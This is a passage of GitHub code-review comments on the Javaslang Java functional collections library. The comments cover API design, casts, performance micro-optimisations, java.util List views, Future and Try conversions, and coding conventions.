object allocation to avoid zeroing out the array */\n            return result;\n        }\n    }\n}\n\n}\n```\n. See suggested code in the comment above.\n. had to look a moment at this for-loop :)\n. The usages of obj() are OK!\n. Looks all good to me. +1 for trying parallel tests - should be a flag in the maven surefire plugin. I created #1652.\n. please do a one-liner like in reverseIterator() and delete the asTraversableAgain method completely:\njava\n} else if (iterable instanceof Traversable && !(iterable instanceof Iterator)) { // TODO: remove second check with 3.0.0\n    final Traversable<T> traversable = (Trabersable<T>) iterable;\n. method to be deleted (see comment above)\n. Can be reverted again.\n. No - obj() looks good to me - it was my fault.\n. Please point me to (one of) the tests. Iterator should be the only TraversableOnce (in our code-base).\n. @paploric you are right - please keep the asTraversableAgain method then but please write a TODO that we remove it with 3.0.0. I think the test can be reverted then, right?\n. theoretically this is a breaking change -- but practically it is not :-)\n- there existed no API that returns a Case0...CaseN (only Case is returned)\n- there was no way to directly construct Case0...CaseN (constructors where private)\n- I think (99.9999%) that Case is only used within Match, which is an ad-hoc computation. Nobody (hopefully) will persist a Case.\nI consider this change to be safe.\n(Note: Because Case0...CaseN are now nested classes of the interface Case, they are implicitly public static.)\n. Thanks for the hint!\n. @paplorinc I don't see how we could use ArrayType. E.g. asArray(java.util.Iterator<?> it, int length) returns an Object[], which cannot be cast to a T[].\nDo you have a hint for me?\n\nExample:\njava\njava.util.List<Integer> list = Arrays.asList(1, 2, 3, 4);\nInteger[] ints = (Integer[]) ArrayType.asArray(list.iterator(), list.size());\nfor (int i = 0; i < ints.length; i++) {\n    int j = ints[i];\n    System.out.println(j);\n}\nOutput:\nException in thread \"main\" java.lang.ClassCastException: [Ljava.lang.Object; cannot be cast to [Ljava.lang.Integer;\n. Yes - also IntMap and IntMultimap hide methods overridden by Map/Multimap because IntMap only extends Traversable. It is not sufficient that they are backed by Map/Multimap. This is the reason we did not recognize a bug...\nWith 3.0.0 we will change the collection type hierarchy 'a bit'\n- Iterator will not be Iterable/Traversable anymore, instead it will be TraversableOnce\n- Map/Multimap will extend Traversable<V> instead of Traversable<K, V>\nThis will make IntMap/IntMultimap superfluous. But for the overridden assert* methods I have currently no better solution...\n. Would it be simpler to have String instead of List?\njava\nString actual = LinkedHashMap....mkString();\nAssertions.assertThat(actual).isEqualTo(\"(3, a)(2, b)(1, c)\");\n. Ok, thank you!\n. Hi @ruslansennov,\nI think we do not need the same KVKVKV variants for ofEntries. We not use just varags:\njava\nofEntries(j.u.Map.Entry<? extends K, ? extends V>... entries)\nofEntries(Tuple2<? extends K, ? extends V>... entries)\n(also with Comparator).\n. Immutable objects are covariant in their generic arguments. However, we will not restrict Map.Entry to be immutable here. Internally we do not store the entries, instead we create immutable Tuples. (This is why we are able to provide static narrow() methods, which are safe for Javaslang but unsafe in general.)\nMore specifically this is not possible in a persistent/immutable setting:\n``` java\nList dogs = ...\nList animals = List.narrow(dogs);\nanimals = animals.add(cat);\n// in a mutable setting the content of dogs would be very interesting :)\n```\nI think the problem with heap pollution is similar here because of the generic parameters of Entry. But because our types are persistent we may narrow these generics from ? extends K and ? extends V to K and V. The cast we perform is safe.\nWe do not provide special methods ofEntries(Map.EntryKVKV) and ofEntries(Tuple2KVKV).\n. @ashrko619 your are right - we can't do that right now. I targeted 3.0.0 for such compatibility breaking changes (see also #1493). I will remove that task from the list above.\n. We do not add additional API for now. We have the following API:\n- Map(KVKVKV) for up to 10 key-value pairs\n- Map(Tuple...) and Map(Entry...) for more than 10 key-value pairs.\nThat is all for this issue/PR.\n. No additional method t here please. We will use Tuple2.narrow() which does not exist. I created #1663, we will change these casts in a later PR.\n. Looks good to me. As Ruslan says, it works - we should spend our energy on the issues.\n. Yes, but for now we do a TreeMap.of(entries/tuples) in a real world app for n > 10.\nFor this test it is ok.\n. @paplorinc please create an issue/proposal for a merge/compose API for Maps.\n. My xs\"\"\"...\"\"\" implementation does automatic indentation. No more .stripMargin necessary. But we leave it this way, it is ok!\n. missing *\n. Our Maps support null keys and null values. No need to check it here.\n. I would name it replaceValue(K key, V newValue) because it is shorter.\n. You chose the functional style, which is great. Here we can avoid the creation of several intermediate objects, which is more GC friendly:\njava\nreturn containsKey(key) ? put(key, newValue) : this;\n(Note: we omit this. most of the time)\n. dito (null is supported)\n. could be simplified by\njava\nreturn contains(Tuple(key, oldValue)) ? put(key, newValue) : this;\n(Where Tuple() is imported from javaslang.API. You can also write Tuple.of(), your choice.)\n. minor: between text and params we do a blank javadoc line most of the time.\n. dito blank javadoc line\n. unnecessary this.\n. > I would rather use the first version and avoid the cast to M. Is that OK?\nPlease cast (M) map.put(key, value). We save an additional Tuple instance which scales for many calls. I see our collections as low-level, they should be as performant as possible. A cast is fast.\n. dito (cast)\n. I've recognized one thing that is outside (but related) to this PR: CharSeq.scan() currently returns IndexedSeq<Character> but it should return CharSeq.\nCould you please change the return type of scan() to CharSeq?\njava\n@Override\npublic IndexedSeq<Character> scan(Character zero, BiFunction<? super Character, ? super Character, ? extends Character> operation) {\n    return Collections.scanLeft(this, zero, operation, Iterator::toCharSeq);\n}\n. minor: unnecessary newline\n. Awesome, that was fast :-)\nCan the method return CharSeq instead of IndexedSeq<Character>?\n. \ud83d\udc4d you are right, Sir!\n. @pivovarit do you have a hint how I can tweak Sputnik's default rules to accept this whitespace?\n. The previous version called TreeMap.put, which was bad for these reasons:\n- TreeMap.put was called, which creates RedBlackTree-wrappers\n- of(...) recursively called O(n) times of() before starting to add values\nThe current version\n- calls put on RedBlackTree, which does not create intermediate TreeMap objects\n- turns the recursive call into an iteration, which is more efficient in this case\n. Using nullsFirst() was terribly wrong. It made unit tests artificially work which were not intended to work.\n. will remove this in a second...\n. this was wrong, because the comparator was not used in the empty case\n. this method was missing\n. Yes, it tests a static method of PriorityQueue. The whole test classes which contains tests for final classes should be also final (HashMapTest, TreeMapTest, ...)\n. no, it must not\n. no, it must not\n. no, it must not\n. no, it must not\n. no, it must not\n. no, it must not\n. no, it must not\n. no, it must not\n. no, it must not\n. no, it must not\n. private: ok\naccessor methods: oh my god - no! (no getters and setters please. we have keyComparator())\n. Stream makes most sense when doing it lazily (for maybe infinite amount of elements). The Stream::prepend currently evaluates the whole Seq eagerly. Therefore please use Vector here instead of Stream.\nThe benefit of Vector: It is also great for random access (approx. O(1)), Stream only has O(n) for random access\n. Because Map.scanRight() returns a Vector (and Vector is our default Seq), Map.scanLeft should also return Vector\n. that's right\n. The result wasn't Serializable if the given comparator was not serializable. The method reference used pulled the argument into the closure.\n. We do it as in all other collections. In 3.0.0 we may change all APIs to accept a new/public SerializableComparator instead of a Comparator to ensure it is Serializable. This is a cross-cutting concern.\n. too rarely used, therefore simplified\n. now making everywhere use of the new singleton\n. It looks fine, no more changes required then. Don't think so. We do not know that, a ClassCastException may occur at runtime.. I think so - however, Java 9 isn't release and it is a Java 9 bug that was accepted (Prio 3). I hope it will be fixed soon - then it doesn't matter any more. However, the point is that we now use a Singleton instance instead of creating a lambda/method reference.. No, this special-handling pollutes our code-base. It is not only the TreeMap - most sorted collections are affected. I added javadoc to Set describing the problem.\nWhere do we stop adding special magic behavior. Has traversable min() use a natural comparator that returns 'null' as minimum. I don't think so.\nWe do it straight forward - the simplest solution possible.. The TreeMap.EntryComparator has two use-cases:\n\nthe natural key-comparator\na specific key-comparator\n\nThe two belong together here. The check for the specfic case is now performed in the EntryComparator factory method, which is common for all callers.. There was a case (in this class I think) where a type-hint was needed, i.e. Comparators.<T> naturalComparator(). Therefore I removed the import. Does not matter so much here.... dito. Yes, the SerializableComparator disappeared. 80% of the special methods (greater, greaterOrEqual, ...) weren't used at all - dead code. When you forget about the assert statements, there are only 2 uses of lessOrEqual() and 1 use of less(). It does not scale and is uncommon - an additional DSL abstraction layer above a well known and concise Java API. We don't need it here.. Sputnik complained about the order: method decls vs class decls. I re-ordered them according to the coding conventions.. @pjagielski Thank you, that helps!. Mmhh, today I did a push --force on a branch/PR that wasn't merged yet. I think something went wrong o_O.\nDon't know how this can be repaired \ud83d\ude48 However, the current master contains these lines already: https://github.com/javaslang/javaslang/blob/master/javaslang/src/main/java/javaslang/collection/Map.java#L677-L703\n@paplorinc is there some git magic that can be applied here? E.g. rebasing / rewriting this PR .... Ok for me - it is performed on a copy on the stack. Btw - when dealing with immutable objects (like in Javaslang), then nothing evil can happen at all!. Will fix that. please move the ofStream methods behind merge (I sorted the methods alphabetically). good!. We do a newline after annotations (in 99.9% of the cases). But please leave it as-is. I will reformat the whole codebase soon according to our formatter. Maybe I will take that opportunity to customize the Sputnik/Checkstyle rules then.. Just a thought: I think we have monadic lifting here, not applicative lifting. A Monad transports the first empty/none/negative state found, an Applicative aggregates all these states on the way down.. I think functors are not enough here, they only have a map() method but we need map() and flatMap(). Please write monads instead. What we really have here is Monad lifting.. I think I do not understand Applicative and Monad right.\nFor me, Monad is just a type having map() and flatMap(), obeying specific laws. In our lift() implementations we make use of map() and (!) flatMap(). Because we use flatMap() and Option et al. are monads, this actually is monadic lifting.\nApplicative has a sequence operator, in Haskell <*>. Our types do not have such an operator. Also flatMap() does not allow us do go down the chain once empty, let's say a None, is reached:\njava\nopt1.flatMap(o1 -> \nopt2.flatMap(o2 -> // <=== We never get here, if opt1 is None.\nopt3.map(o3 -> f.apply(o1, o2, o3));\n. I wish we would be able to efficiently insert just one element into the BMT without creating an new (Iterator/List) instance that is thrown away immediately. That is inefficient. We do not measure the GC effects but in a real world application GC happens and matters!. Making it package-private suggests to me that it is called from the outside of BMT. Separation of concerns!?. If source is a LinearSeq this means one more time completely traverse it => bad, right?. Why don't we store the result of obj() once in a final local field? (=> only in several other locations of this PR). nonEmpty() has one more method call then isEmpty(), but I think you say because of JIT magic it does not matter because it is inlined.\nWhat is the latency of inlining? I think it will cost something! The effort can't be zero. I see trusting in inlining like blurring the reality.. Is the benefit that much?\nI think it is important to have a clean programming style for the reason of maintainability. We add guards that check the method arguments at the start of our method bodies.. O(n) for changing the type (which should be static in a statically typed language) IS EVIL.. This must not necessarily be a set. I would write\njava\n@return The comparator that defines the order of this collection's elements.. makes sense!. The control-flow is somehow 'overlapping' because the if-else-block cannot be substituted with a function call.\nPlease use this more 'straight-forward' version:\njava\nif (this instanceof PriorityQueue) {\n    return (PriorityQueue<T>) this;\n} else {\n    final Comparator<T> comparator = (this instanceof Comparator)\n        ? ((Comparator<T>) this)\n        : (Comparator<T> & Serializable) (o1, o2) -> ((Comparable<T>) o1).compareTo(o2);\n    return toPriorityQueue(comparator);\n}\n. Off-topic: Don't know why we used the <?> everywhere in instanceof checks - they are not really needed and add no value here. Nevermind, you don't need to change all occurrences in this PR.. Don't revert it. But readers of the code are not aware of these facts. You can understand it only if you know all the internals of the underlying machinery. Following simple rules is more straight-forward/easier to understand and to maintain.... ok. @io7m @paplorinc for me the code is perfectly ok. Limiting the scope is a well thought-through decision.\n~~@io7m Please add shuffle() also to IndexedSeq and I can merge this PR!~~ Update: Oh, you did it already! Nice. Please move these below hasDefiniteSize(). Please make local vars final where applicable.\nI know - it may look strange to you but we use it because it emphasis the immutable/functional nature of our code. I really hope that Java will get the more concise val!. Yes, or unbox a NonFatalException in the default toCompletableFuture impl.\nUnboxing it is perfectly ok because there is no public API that allows a call-site to construct a NonFatalException outside of a Try. Please find the suggested impl above.... This is a good way to handle exceptions in the CompletionStage. However, as you mentioned below, it makes sense to handle Try.NonFatalException in a special way.\nBecause FatalException and NonFatalException cannot be created outside of a Try, they are under our control and it is safe to unbox them. I.e. we know that their only purpose is to wrap exceptions in a RuntimeException.\nFrom what I see the code should look look this:\njava\nfinal CompletableFuture<T> completableFuture = new CompletableFuture<>();\ntry {\n    completableFuture.complete(get());\n} catch(Try.FatalException x) {\n    throw x;\n} catch(Try.NonFatalException x) {\n    completableFuture.completeExceptionally(x.getCause());\n} catch(Throwable x) {\n    completableFuture.completeExceptionally(x);\n}\nreturn completableFuture;\n. minor: can be final. minor: can be final. minor: can be final. dito. dito. dito. dito. dito. dito. dito. dito. dito. dito. The FutureImpl is isolated - there are exactly two occurences/usages: In Future.of() and in Promise.make(). All other API should build on these and not use FutureImpl directly. This scales better from the design perspective.\nIn our case we should use the following impl:\njava\nfinal Promise<T> promise = Promise.make();\nfuture.handle((t, err) -> {\n    if (err == null) {\n        promise.success(t);\n    } else {\n        promise.failure(err instanceof CompletionException ? err.getCause() : err);\n    }\n});\nreturn promise.future();\nNote: The upcoming release will (but currently does not) contain a more concise syntax:\njava\nreturn Future.of(p -> completableFuture.handle((t, err) -> {\n    if (err == null) {\n        p.success(t);\n    } else {\n        p.failure(err instanceof CompletionException ? err.getCause() : err);\n    }\n});\n. We could also write java.util.concurrent.CompletableFuture as {@code } or {@link }.... dito. For Functions / CheckedFunctions we use per default f as identifier. However, that's merely the only abbreviation. Predicate and Supplier are named predicate and supplier. Consumer is often called action throughout the codebase.\n(Changing wideFunction to f should be a no-brainer because it is generated code.). unchecked is a helper, not a type. Therefore it starts lower-case. this is ambiguous to Future(T). We need the concrete type towards pattern matching 3.0.0:\njava\nList(Try(() -> 1/0)).collect( Case(Success(1), \"one\") )\n. ambiguous API. see http://stackoverflow.com/a/18163768/1110815. did not compile (any more!?) without that cast. Scala:\nscala> IndexedSeq()\nres0: IndexedSeq[Nothing] = Vector()\n. Scala:\nscala> Seq()\nres0: Seq[Nothing] = List(). Scala:\n```\nscala> Try(1)\nres0: scala.util.Try[Int] = Success(1)\nscala> Try(1/0)\nres1: scala.util.Try[Int] = Failure(java.lang.ArithmeticException: / by zero)\nscala> Success(1)\nres2: scala.util.Success[Int] = Success(1)\nscala> Failure(new Error())\nres3: scala.util.Failure[Nothing] = Failure(java.lang.Error)\n```. Scala:\nscala> Map(1 -> \"a\", 2 -> \"b\")\nres0: scala.collection.immutable.Map[Int,String] = Map(1 -> a, 2 -> b)\n. Scala:\n```\nscala> Future(1)\nres0: scala.concurrent.Future[Int] = scala.concurrent.impl.Promise$DefaultPromise@57404a8d\nscala> Future(1/0)\nres1: scala.concurrent.Future[Int] = scala.concurrent.impl.Promise$DefaultPromise@6cddb04c\n```. :+1:. No, sorry. this does not look right. If you want column-alignment spring for a new-line (like everyone else does):\njava\nreturn alternativeImplementations\n        .map(altImpl -> Tuple.of(altImpl, alternativeResults.find(r -> altImpl.equals(r.getImplementation()))))\n        .map(alt -> Tuple.of(alt._1, calculateRatioStr(result, alt._2)))\n        .map(alt -> padRight(alt._2, altImplColSize(alt._1)))\n        .mkString(\"  \");. This is also no option for us :-/ It differs from all other methods of that interface.. there is no need to expose internals!. debug-code??. easily possible to get that information without exposing internal information. even more easy.... ~~Please remove the formatter:off. I will remove all these occurrences from our code base. We use a formatter to unify the code. Either we use a formatter or we do not use it. But switching code parts on and off is like hell.~~\n@paplorinc Update: Please keep the formatting. I never had been happy with formatters. I would prefer to switch formatters completely off and just perform some checkstyle checks.\nIt reminds me of checkstyle tweaks: \"We want to have line length X. But in these cases we want to have line length X+Y\".\nDon't be too obsessed with formatting. We have a formatter, so just apply it and forget about formatting. I think you are a mirror of myself. I also tend to easily get carried away and rambling on.\n\nAlso the need for formatter:off sections might be a sign that we need additional formatting to understand our own API. The API should be expressive and concise on its own, with 'default' formatting.. @seanf \n\nI'm not sure if you're aware, but GitHub doesn't generally send email notifications about edited comments. @paplorinc may not see your last edit without a mention in a new comment (like this).\n\nThank you for the hint. I did mention him in the edit:\n\n@paplorinc Update: Please keep the formatting.... @paplorinc keep it as-is for now. Let's not discuss about formatting (I did spend two days on formatting now) - I'm working on an overview how we get these collection views into Javaslang. Please stay tuned.. no - I had to remove these previously (when invoking doclint), the <ul> already introduces a break!. The cast to T does not work. A java.util.List(1, 2, 3).contains(\"abc\") should return false instead of throwing a ClassCastException.. Cast does not work. Instead of casting all the things we should narrow our delegate to Seq<Object> or Seq<?>.. java\nfinal int length = seq.length();\nseq = seq.insertAll(index, c);\nreturn seq.length() != length;\n. good. good. ~~good~~. We should not add additional API to our collections without having it discussed first! Especially we will not add a method that returns a java.util.ListIterator. Javaslang's collections are designed to co-exist beside Java's standard-collections. There are well-defined conversion methods between them but adding operations with types 'from the other side' mixes it up too much. ==> ListIterator is meant to be used with a java.util.List.. We should be careful with implementing logic that does break the applications of our users. I know that it is not possible in each case but Javaslang should not throw any 'UnsupportedOperationException'. I will update the CONTRIBUTION guidelines accordingly!. Update: Cast works accordingly to the List.containsAll API spec!. Update: List.subList(int, int) does throw IndexOutOfBoundsException, so should we. slice() does not throw, so we have to use subSequence().. please revert Generator.java - I will prepare another PR. please revert this file again. I see that you discovered a similarity but I prefer to revert this change. We gain nothing from the viewpoint of performance but hide what is going on. The implementation is concise and expressive enough to do it directly. Additionally we do not introduce additional complexity by adding a layer of indirection to a different concept (java.util.Collection conversion layer).. Please add this method as default method after Set<T> addAll(Iterable<? extends T> elements); as part of the non-static API. See also CONTRIBUTION.md: \"File Structure\".. please move this method also (see comment at Seq.java: asJava()). please move this method also (see comment at Seq.java: asJava()). please move this method also (see comment at Seq.java: asJava()). we can remove this method. Lets pass the ListIterator constructor as method reference and do not subclass it:\n\njava\nreturn new SeqAsJavaList<T>(seq, (delegate, index) -> new IndexedSeqListIterator<>((IndexedSeq<T>) delegate, index));. Lets pass the ListIterator constructor as method reference and do not subclass it:\njava\nreturn new SeqAsJavaList<T>(seq, (delegate, index) -> new LinearSeqListIterator<>((LinearSeq<T>) delegate, index));. can be private again. please add\njava\nprivate ListIteratorFactory listIteratorFactory;\n. (see the new ListIteratorFactory interface additions below). Please add\njava\n    @FunctionalInterface\n    private interface ListIteratorFactory<T> extends BiFunction<Seq<T>, Integer, ListIterator<T>>, Serializable {\n        // needed!?\n        long serialVersionUID = 1L;\n    }. please replace this constructor with\njava\nSeqAsJavaList(Seq<T> delegate, ListIteratorFactory listIteratorFactory) {\n    this.delegate = delegate;\n    this.listIteratorFactory = listIteratorFactory;\n}. java\nreturn listIteratorFactory.apply(this, 0);. java\nreturn listIteratorFactory.apply(this, index);. I'm still unsure what to return but not the string representation of the delegate because this is of type j.u.List. Will think about it.. (see above). (see above). (see above). (Note: In this case we prefer composition over inheritance to add specific behavior. That's the reason I added the ListIteratorFactory). Oh , copy-paste error. I meant to move all the asJava() methods alphabetically (within the section above 'Adjusted return types'). :) I was in a 'flow' during my first morning coffee. @paplorinc I see the output of List.toString() as part of the interface spec. We should return the same as Java:\n```java\n        List list = new ArrayList<>();\n        println(list);\n        list.add(1);\n        list.add(2);\n        println(list);\n    println(Collections.emptyList());\n    println(Collections.singleton(1));\n\n```\nOutput:\njava\n[]\n[1, 2]\n[]\n[1]\nPlease change the toString() of the List view as I initially suggested:\njava\n        @Override\n        public String toString() {\n            return delegate.mkString(\"[\", \", \", \"]\");\n        }\nNote: The views for the other j.u. collections should also produce output identically to existing Java impls, e.g.\n\n*AsJavaList.toString() = ArrayList.toString()\n*AsJavaMap.toString() = HashMap.toString()\n*AsJavaSet.toString() = HashSet.toString()\n\nSet:\n```java\n        Set set = new HashSet<>();\n        println(set);\n        set.add(1);\n        set.add(2);\n        println(set);\n// output:\n[]\n[1, 2]\nclass java.util.HashSet\n```\nMap:\n```java\n        Map map = new HashMap<>();\n        println(map);\n        map.put(1, \"a\");\n        map.put(2, \"b\");\n        println(map);\n// output:\n{}\n{1=a, 2=b}\n```\n. good catch!. yes, that would be great!\nwe can remove all the Objects.requireNonNull checks of dropUntil and dropWhile then. It is sufficient to have the checks within Collections:\njava\n    @SuppressWarnings(\"unchecked\")\n    static <T, S extends IndexedSeq<T>> S dropUntil(S empty, S seq, Predicate<? super T> predicate) {\n        Objects.requireNonNull(predicate, \"predicate is null\");\n        for (int i = 0; i < seq.length(); i++) {\n            if (predicate.test(seq.get(i))) {\n                return (S) seq.drop(i);\n            }\n        }\n        return empty;\n    }\n. Minor: We use alphabetic order by convention (see CONTRIBUTION.md / File structure).. great!. You are right, I also thought about it. But when we run into the UnsupportedOperationException case, there is something wrong at the call-site and code has to be fixed. Then it should not matter.\nIt is nice (from the maintainability side) to have one central spot that contains the relevant code.. Yes, we can do better. The next commit will contain it!. I took a look at AbstractList and don't see how we can use its implementations of hashCode() and equals(). I don't expect them to change ever because it would have effects on existing code bases.. Ok, I will change it. To get sure, we could add unit tests for that.. @seanf\n\nYou know what I'm going to say to that question. :-)\n\nYes :-)\nYep, you are right. In the immutable case we should throw. Here is a test:\n```java\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.ListIterator;\npublic class Test {\npublic static void main(String[] args) {\n    Test test = new Test();\n    test.testMutable();\n    test.testImmutable();\n}\n\nvoid testMutable() {\n    List<Integer> list = new ArrayList<>();\n    list.add(1);\n    list.add(2);\n    list.add(3);\n    testListIterator(list);\n}\n\nvoid testImmutable() {\n    List<Integer> list = Arrays.asList(1, 2, 3);\n    testListIterator(list);\n}\n\n<T> void testListIterator(List<T> list) {\n    ListIterator<T> iter = list.listIterator();\n    iter.next();\n    iter.remove();\n    System.out.println(list);\n}\n\n}\n```\nOutput:\nbash\n[2, 3]\nException in thread \"main\" java.lang.UnsupportedOperationException\n    at java.util.AbstractList.remove(AbstractList.java:161)\n    at java.util.AbstractList$Itr.remove(AbstractList.java:374)\n    at javaslang.Test.testListIterator(Test.java:37)\n    at javaslang.Test.testImmutable(Test.java:31)\n    at javaslang.Test.main(Test.java:18)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n    at java.lang.reflect.Method.invoke(Method.java:498)\n    at com.intellij.rt.execution.application.AppMain.main(AppMain.java:147). Just realized that our ListIterator should mutate the List in the mutable case... will fix that.\nUpdate: Given that a ListIterator acts on the original List, it will be O(n^2) for LinearSeq impls. I will first complete the implementation, then we will se how it can be optimized. We need the original persistent collection reference in order to be able to convert the j.u.List back to a Javaslang collection in O(1). /cc @seanf . Yes, I will add a complete unit test suit for j.u.List and j.u.ListIterator!. These are already optimizations. Currently we have a minimal impl that does work for all kind of views. When adding Map (and Set) views we will refactor commonalities.\nMy first goal is to get the (upcoming) unit tests green.\n. You are right, the ArrayList impl checks for concurrent modification from the outside. implemented for all sequences now. this notion has several advantages:\n\nj.u.List is scoped / does not escape\nfluent API\nwe benefit from inference, i.e. not full qualified names required on name clashes between standard Java and Javaslang:\n\nJava\nList.of(1, 2, 3)\n    .asJavaMutable(list -> {\n        // hah!\n        list.add(4);\n    })\n    .filter(i -> i % 2 == 0); // = List(2, 4)\nMore specifically:\n```Java\njavaslang.collection.List numbers = List.of(1, 2, 3);\n// = List(2, 4)\njavaslang.collection.List filtered = numbers.asJavaMutable(list -> {\n    // hah!\n    list.add(4);\n}).filter(i -> i % 2 == 0);\n// numbers is still List(1, 2, 3)!\n```. same for all seqs - set and map versions will follow. we can't define Traversable.asJava() that returns j.u.Collection<T> because j.u.Map does not extend Collection.. The abstract test contains the methods that are common for immutable and mutable versions.\nIt is parameterized with a List factory, so we can test our test-cases with standard j.u.List impls and Javaslang List views.\nIt is important to test against j.u. Collections in order to ensure that our tests are correct and our views behave exactly as standard Java (e.g. when concurrent modifications occur, hashCode, equals and toString etc.)\n(Now I will add missing tests...). We do not need test all of our collections - we only need to test, if our view impl is correct for all general types that are supported (like IndexedSeq, LinearSeq, Set, SortedSet, ...). Added exact type parameter C and returning the view type in order to be able to pull out the original delegate later from within a Javaslang collection.. filling the 'overlapping' tail now with nulls, as you suggested. we will need good tests for set, add and remove in conjunction with next/prev and hasNext/hasPrev. This is tricky stuff when the ListView is mutable.... @seanf Thank you Sean, I will fix that! (Note to myself: do not make assumptions, read the docs). The types are ok to the point where we call methods on a Javaslang collection of type C:\njava\n<T, C extends Seq<T> test(C seq) {\n    // we know that the result is of type C but we get a Seq<T>\n    seq.map(t -> t);\n}\nI see no other possibility than doing an unsafe cast. My first version had casts all over the View implementation. But we can do that unsafe cast in a central place, which seems to be better.\nI agree that this is a fragile contruct. But we deal only with basic j.u.Collection (and j.u. Map) operations like add(), put(), remove(), ... It should be safe.. A mutable j.u.List view ran into a StackOverflowError when a List was added to itself and afterwards it was checked if it containsAll() of its own elements:\njava\nfinal java.util.List<Object> testee = empty();\ntestee.add(testee);\nassertThat(testee.containsAll(testee)).isTrue();\nThis simplification fixes that problem.. My first thought was why we are not returning the generator directly? I think the min/max bounds need to be calculated only once. I see that I did the same for Arbitrary.integer(). But I think it does not make sense...\njava\nreturn size -> Gen.choose(median.minus(size, unit), median.plus(size, unit));. I think Gen is the wrong place for this method. Gen is a general construct for specifying how to generate random values of primitive types and generic objects.\nMore complex logic can (and should) build solely on this.\nSee my next comment how to move this to Arbitrary.... We move the logic from Gen to Arbitrary like this:\njava\nObjects.requireNonNull(median, \"median is null\");\nObjects.requireNonNull(unit, \"unit is null\");\nreturn size -> {\n    final LocalDateTime start = median.minus(size, unit);\n    final LocalDateTime end = median.plus(size, unit);\n    final long duration = Duration.between(start, end).toMillis();\n    final Gen<Long> from = Gen.choose(0, duration);\n    return random -> start.plus(from.apply(random), ChronoUnit.MILLIS);\n}\n(Note: We name the parameters directly in the error messages)\nSome Gen.localDateTime tests might be obsolete or need to be moved to ArbitraryTest.... great!. When you test exceptional cases (like here) please perform just a call - the variable is not needed, i.e.\njava\n@Test(expected = NullPointerException.class)\npublic void shouldNotAcceptNullMedianLocalDateTime(){\n    Arbitrary.localDateTime(null, ChronoUnit.DAYS);\n}\n. dito. this line can be removed (variable end not used). this line can be removed (variable start not used). Please add a null-check, we do it by convention for better readability of stack traces:\njava\nObjects.requireNonNull(action, \"action is null\");. Great, thank you!. Thank you, you are absolutely right. Will push a fix.. Let's return of(supplier::get) to reduce duplicate code. The compiler will translate the method reference to a simple method call - there's no additional overhead.\nPlease do this for all other static factory methods we introduce in this PR, too.. Hah, forgot that myself :). We need the\njava\nObjects.requireNonNull(supplier, \"supplier is null\");\neverywhere because of the ::get call. Otherwise it will throw a NPE before we enter of(CheckedSupplier).... java\nObjects.requireNonNull(callable, \"callable is null\");. java\nObjects.requireNonNull(runnable, \"runnable is null\");\n. Yes, we do it everywhere. Seems like ballast but the developer experience (DX) is better. Like a polished \uf8ff product.. cool, better than using @Test(expected = NullPointerException.class)!. We could simplify the operations a bit (read delegate length, subtract 1 and subtract i) like this:\njava\nfinal int length = delegate.length;\nfor (int i = 0, j = length - 1; i < length; i++, j--) {\n    arr[j] = delegate[i];\n}\n. @paplorinc \n\nand using i and j in the declaration order:\n\nhighly subjective but I don't mind :) could be also seen as 1st read from source 2nd write to target. It is just subjective\nThe length in i < delegate.length is read from heap. When introducing final int length = delegate.length, length is put on the stack. The loop accesses length n times, so it might matter.. @paplorinc I not completely agree. The are things defined by the JVM spec that are crystal clear, e.g. heap vs. stack access.  Stack access can't be faster (other than register access), only heap access can be faster. There are two usages of delegate.length, which is kind of redundant. Adding a local length variable also clarifies that the same length is meant.\nRegarding the existing issues I would add a priority $numberOfIssues (greater is less important) to adding a benchmark for the use of a local variable.. I think this form of optimization makes most sense for code that is not optimal. But it should not prevent us from writing optimal code if it is still concise and maintainable.\nIt might also reduce the effort for an escape analysis. JIT: \"Already on stack? Ok, nothing to do.\". I see, we have different styles of coding and a different approach to conciseness. It's ok.. @AlparSzabados please use the following snippet.\njava\nfinal int length = delegate.length;\nfor (int i = 0, j = length - 1; i < length; i++, j--) {\n    arr[j] = delegate[i];\n}\n(Too much discussion for minor things here)\n. @paplorinc We could do that. However, I checked the code. It looks good to me, the original issue should be fixed. I will move the optimization you suggested to #1800.. re-ordered the transpose methods alphabetically. only call get when necessary. Made it type-safe. may be also helpful if we decide to add CharSeq.transpose(Seq<CharSeq<T>>) in future.. In fact rowFactory and columnFactory would fit better - a mapper maps the elements, not the wrapper. This one is really minor because it is not public API.. Yes. I also requested a default value (which is currently implicitly null).. First storing s.th. and then retrieving it again makes no sense to me. It is like sending a letter to my own address. Why should I do that if I hold the letter in my hands?\nHaving a name 'newRow' clarifies what we are dealing with. In a functional setting you would extract the logic to a new method if it gets too complicated (which is not the case here).\njava\nnewRow(results, columnIndex).add(element);\n. From what I can see the other tests logically serve a different purpose. They test if the contents are the same. The identity tests ensure that the references are the same. Technically they overlap but the semantics are different. I would leave them for now.. You assume too much on the technical layer. On the semantic layer it makes no sense to send a present mail to myself.. I don't understand!? of course map functions have a mapper, the map the elements, not the container.. yes, mhh, that might be seen as bug. Yes, sounds good \ud83d\ude0a \nI will push an update that includes\n\nCharSeq.transpose(Seq<CharSeq>>)\nbetter names (rowFactory, columnFactory)\nthe matrix checks (throwing IllegalArgumentException is ok). If the size is known I rather have a T[][] resp Object[][] in mind.... I like to have matrix because it tells us something about the domain.\n\n@paplorinc Please add @throws IllegalArgumentException if rows is not a regular n x m matrix. (or similar - your call) to the public transpose methods.. @paplorinc Yes:\njava\nreturn Match(values).of(\n    Case(Patterns.List($(), $()), (x, xs) ->\n            xs.partition(v -> v <= x)\n              .apply((less, more) -> sort(less).append(values.head()).appendAll(sort(more)))),\n    Case($(), () -> values)\n);\nSpoiler alert: We use javaslang.Patterns.List here, which will be obsolete in near future.... Currently not. I plan to revise the patterns. The List Pattern will be deprecated. Instead we will have a Cons and a Nil pattern, directly encoded in javaslang.API.\nYou could define your own patterns, directly within Quicksort (I think / depends on the build order and pattern code generator - haven't tested it):\n```java\npublic class Quicksort {\n... // use Quicksort$Patterns.Cons here <-- not sure about the name of the class, too lazy to look it up\n\n@Patterns\nstatic class $ {\n    @Unapply\n    static <T> Tuple2<T, List<T>> Cons(List.Cons<T> cons) {\n        return Tuple.of(cons.head(), cons.tail());\n    }\n\n    @Unapply\n    static <T> Tuple0 Nil(List.Nil<T> nil) {\n        return Tuple.empty();\n    }\n}\n\n}\n```\nFor Seq there is 